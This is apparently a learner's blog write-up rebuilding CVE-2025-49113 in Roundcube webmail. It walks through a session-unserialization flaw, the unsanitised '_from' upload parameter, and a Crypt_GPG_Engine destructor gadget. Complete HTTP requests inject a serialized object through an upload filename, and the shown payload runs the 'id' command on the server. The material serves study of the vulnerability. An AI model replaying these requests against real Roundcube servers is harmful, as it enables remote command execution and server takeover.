---
title: "Rebuild CVE-2025-49113"
categories: ["Writeup"]
tags: ["Web"]
#externalUrl: ""
date: 2025-06-12
draft: false
authors:
  - Hibwyli
---
# Rebuild CVE-2025-49113
Source : https://fearsoff.org/research/roundcube
# Root cause : 

- Bug at custom unserialization 
- Sink In Secure Deserialization at Pear Crypt package. 
# Introduction:
- Roundcub is a free and open source webmail software for the masses, written in PHP.
# How roundcube handle session ? 
- It will serialize of data and then base64 encode then store into MYSQL at table session with columns vars. It sound simple right ?  But the problem when you try to decode that base64 is :

![image](https://hackmd.io/_uploads/HJehlevmgl.png)

- Well you can see that its use a weird structure when comparing to the normal .

For example , with this data : 
```php
$data = [
    'injected' => [
        "aaa" =>"b",
        "cccc" =>"d"
    ],
    'injected2' => 'PWNED2',
];
```

**The result will be : **
```php
Normal : a:2:{s:8:"injected";a:2:{s:3:"aaa";s:1:"b";s:4:"cccc";s:1:"d";}s:9:"injected2";s:6:"PWNED2";}
Custom : injected|a:2:{s:3:"aaa";s:1:"b";s:4:"cccc";s:1:"d";}injected2|s:6:"PWNED2";
```

- So its store data something like  (When writing this, i dont know that there's many kinds of serializing and this is the 'php' one , the others are php-binary , php-serialize....)  :
```php
<KEY OBJECT>|<SERIALIZED DATA>
```

The custom one is implemented  : 

<details>
  <summary>Show Implementation Code</summary>

{{< highlight php >}}

function myUnserialize($str)
    {
        $str = (string) $str;
        $endptr = strlen($str);
        $p = 0;

        $serialized = '';
        $items = 0;
        $level = 0;

        while ($p < $endptr) {
            $q = $p;
            while ($str[$q] != '|') {
                if (++$q >= $endptr) {
                    break 2;
                }
            }
            // $q after the while q = index of "|"
            // $p = current index
            if ($str[$p] == '!') {
                $p++;
                $has_value = false;
                //THis lead to the username not have value and the left will be put into check
            } else {
                $has_value = true;
            }

            $name = substr($str, $p, $q - $p);
            $q++;

            $serialized .= 's:' . strlen($name) . ':"' . $name . '";';

            if ($has_value) {
                while (true) {
                    $p = $q;
                    switch (strtolower($str[$q])) {
                        case 'n': // null
                        case 'b': // boolean
                        case 'i': // integer
                        case 'd': // decimal
                            do {
                                $q++;
                            } while (($q < $endptr) && ($str[$q] != ';'));
                            $q++;
                            $serialized .= substr($str, $p, $q - $p);
                            if ($level == 0) {
                                break 2;
                            }

                            break;
                        case 'r': // reference
                            $q += 2;
                            $id = '';
                            for (; ($q < $endptr) && ($str[$q] != ';'); $q++) {
                                $id .= $str[$q];
                            }
                            $q++;
                            // increment pointer because of outer array
                            $serialized .= 'R:' . (intval($id) + 1) . ';';
                            if ($level == 0) {
                                break 2;
                            }

                            break;
                        case 's': // string
                            $q += 2;
                            $length = '';
                            for (; ($q < $endptr) && ($str[$q] != ':'); $q++) {
                                $length .= $str[$q];
                            }
                            $q += 2;
                            $q += (int) $length + 2;
                            $serialized .= substr($str, $p, $q - $p);
                            if ($level == 0) {
                                break 2;
                            }

                            break;
                        case 'a': // array
                        case 'o': // object
                            do {
                                $q++;
                            } while ($q < $endptr && $str[$q] != '{');
                            $q++;
                            $level++;
                            $serialized .= substr($str, $p, $q - $p);
                            break;
                        case '}': // end of array|object
                            $q++;
                            $serialized .= substr($str, $p, $q - $p);
                            if (--$level == 0) {
                                break 2;
                            }

                            break;
                        default:
                            return false;
                    }
                }
            } else {
                $serialized .= 'N;';
                $q += 2;
            }
            $items++;
            $p = $q;
        }
        return unserialize('a:' . $items . ':{' . $serialized . '}');
    }
{{< /highlight >}}

</details>

I created a graph to explain the flow of this  :
![Drawing 2025-06-11 15.50.27.excalidraw](https://hackmd.io/_uploads/HkPnffPmge.png)


- So in short if your key have the "!" at first this will result in : 
```php
$data = [
    '!injected' => [
        "aaa" =>"b",
        "cccc" =>"d"
    ],
    'injected2' => 'PWNED2',
];
```
![image](https://hackmd.io/_uploads/SJ4axlwmel.png)
- You can see the *injected* key is value = None. It start to read right after the first "|" and  it find the next "|" and set the new key = everything before "|" ....
![image](https://hackmd.io/_uploads/Hy3Tlew7el.png)

  ==This lead to SESSION CORRUPTION. ==
# So how can we abuse this ?
The current problem is we cannot handle the KEY in the session for our purpose . Which we can control now is just the value which not too useful now. So now we want to find some thing like $_SESSION["__everykey__"] = $controlled_value.
Find hard in the source code ,you can find there is sth interesting at  _./program/actions/settings/upload.php_

![image](https://hackmd.io/_uploads/r13gbevmee.png)

- Now you can see that it get the value from $_GET["_from"] without any sanitized.
- Then replace the (add|edit) and push it value into our SESSION ?
Try to upload our images and check the database :
![image](https://hackmd.io/_uploads/rJb4ZePQxx.png)


```http=
POST /?_task=settings&_framed=1&_remote=1&_from=edit-identity&_id=&_uploadid=upload1749641647222&_unlock=loading1749641647222&_action=upload HTTP/1.1

IMAGE
```
- Here we go , my "identity" key go straight into the session now !!!
![image](https://hackmd.io/_uploads/HkFGblDmge.png)

So now we handle the key , now lets try to add a malicious key into our session !!! So by understanding the bug , I can try to create my payload like this . We can combine the "!"  at the key with the value (filename) contains "|" to create something interesting. 

*The ideas:*
Normal filename lead to : 
**!identity|..............................everything just data not have the '|' so just get skipped all..........**

Malicious  filename  which has ("|") lead to :
**!identity|.........(meet the "|"in filename)..... | s:1:"a"; (--EVERYTHING SERIALIZED YOU WANT--)**

```http=
POST /?_task=settings&_framed=1&_remote=1&_from=edit-!identity&_id=&_uploadid=upload1749641647222&_unlock=loading1749641647222&_action=upload HTTP/1.1
......
STUFFS..
......
Content-Disposition: form-data; name="_file[]"; filename="|s:1:\"a\";inject|O:5:\"pwned\":0:{};"
```

- Then dumps database and unserialize to see the result : 
![image](https://hackmd.io/_uploads/SyCw-xDQge.png)

**My OBJECT is created now in the SESSION !!!**

## Final chain : 
- So the final things we need is a gadget to trigger the chain.
- Fortunately there's a vendor vulnerable to this !!
```php
// vendor/pear/Crypt/GPG/Engine.php
 public function __destruct()
    {
        $this->_closeSubprocess();
        $this->_closeIdleAgents();
    }
 private function _closeIdleAgents()
{
	if ($this->_gpgconf) {
		// before 2.1.13 --homedir wasn't supported, use env variable
		$env = array('GNUPGHOME' => $this->_homedir);
		$cmd = $this->_gpgconf . ' --kill gpg-agent';

		if ($process = proc_open($cmd, array(), $pipes, null, $env)) {
			proc_close($process);
		}
	}
}
```
- So we just need to create an serialize for this one my payload is (in custom serialize form): 
```php
$seri = '0|O:16:"Crypt_GPG_Engine":1:{s:8:"_gpgconf";s:4:"id;#";}';
```
- The pear has fixed this bug with adding checking if the $this->_gpconf is executable before add into the $cmd.
Then try it on server : 

```js
POST /?_task=settings&_framed=1&_remote=1&_from=edit-!identity&_id=&_uploadid=upload1749642336188&_unlock=loading1749642336189&_action=upload HTTP/1.1
....
STUFF
......
Content-Disposition: form-data; name="_file[]"; filename="|s:1:\"a\";0|O:16:\"Crypt_GPG_Engine\":1:{s:8:\"_gpgconf\";s:4:\"id;#\";}"
```
And look at the logs of server : 

![image](https://hackmd.io/_uploads/HJ3ubgD7xg.png)

# Question  :
### Why we cant put payload into the key ? 
If you test this local , it will work !!
```php
$data = [
    '!identity xxx|| b:0;test|O:16:"Crypt_GPG_Engine":1:{s:8:"_gpgconf";s:4:"id;#";}' => 'PWNED2',
];
--> This work the same
```
But when tries on the server it will fail due to some restrictions.
After reading the documents I finally finds the problem.
![image](https://hackmd.io/_uploads/BJsBNZvXeg.png)

And my current app is implementing a custom session handler : 
```php
        ini_set('session.serialize_handler', 'php'); => Not allow the "!" and "|"
        // set custom functions for PHP session management
        session_set_save_handler(
            [$this, 'open'],
            [$this, 'close'],
            [$this, 'read'],
            [$this, 'sess_write'],
            [$this, 'destroy'],
            [$this, 'gc']
        );
```
- It seems the "|" and "!" is not allowed in $_SESSION.
### So why the heck the "!" in our payload still works...
In the legacy php session serialization format, both | and ! are special delimiters:
 These key STILL BE **WRITED** in $_SESSION but not **STORED**
"|" separates the session variable name from its serialized value
```php
user|s:5:"alice";roles|a:2:{i:0;s:5:"admin";i:1;s:6:"editor";}
```
==> This is not stored into $_SESSION and NOT give sess_write any data to write into db .

"!" is used in php_binary (another legacy format), but not usually in plain php format
```php
\0user!s:5:"alice";\0roles!a:2:{i:0;s:5:"admin";i:1;s:6:"editor";}
```
==> This just not stored into $_SESSION but **still give data for sess_write :)) wtf**

After suffering a little bit , i realized that i misunderstood :vv . There's a sanitize at the "|" in php and the "!" in php-binary not both . Ok clear documentation :(
# Conclusion : 

- This is my first time trying to rebuild a CVE. This is almost based on the blog I read and try to test on my machine . I think it will be a good start before my trying to build the CVE with just details. Btw, its good to learn the way the author audits the code and find the gadget. Thanks author for a great detail blog.